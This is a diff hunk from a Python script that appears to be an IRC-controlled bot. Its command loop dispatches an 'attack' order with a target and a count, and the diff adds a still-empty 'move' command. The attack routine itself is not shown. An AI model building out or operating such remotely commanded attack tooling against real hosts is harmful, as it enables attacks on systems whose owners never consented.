@@ -152,6 +152,9 @@ if __name__ == "__main__":
                                         attack(s, sender, arguments[1], int(arguments[2]))
                                     else:
                                         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : invalid attack\r\n', 'utf-8'))
+
+                                elif 'move' in args[1]:
+                                    arguments = args[1].split()
                     #print(response)
                 s.close()
 
